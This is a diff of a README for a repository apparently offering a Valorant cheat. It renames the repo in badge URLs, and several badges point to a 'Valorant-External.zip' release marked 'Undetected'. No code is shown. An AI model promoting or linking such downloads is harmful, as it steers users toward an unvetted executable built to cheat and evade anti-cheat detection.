@@ -22,8 +22,8 @@
 [![OS](https://img.shields.io/badge/Windows-10_%7C_11-0078D4?style=flat-square&logo=windows)](../../releases/download/main/Valorant-External.zip)
 [![Status](https://img.shields.io/badge/Status-Undetected-00C853?style=flat-square&logo=checkmarx)](../../releases/download/main/Valorant-External.zip)
 [![License](https://img.shields.io/badge/License-MIT-blueviolet?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/StitchStone32/valorant-free-cheat?style=flat-square&color=FFD700)](../../stargazers)
-[![Downloads](https://img.shields.io/github/downloads/StitchStone32/valorant-free-cheat/total?style=flat-square&color=FF4655)](../../releases)
+[![Stars](https://img.shields.io/github/stars/StitchStone32/valorant-external?style=flat-square&color=FFD700)](../../stargazers)
+[![Downloads](https://img.shields.io/github/downloads/StitchStone32/valorant-external/total?style=flat-square&color=FF4655)](../../releases)
 
 <br/>
 
@@ -347,6 +347,7 @@ By using this software, you accept **full personal responsibility** for your own
 ![Views](https://komarev.com/ghpvc/?StitchStone32=StitchStone32&label=Repo+Views&color=FF4655&style=flat-square)
 
 </div>
+
 
 
 
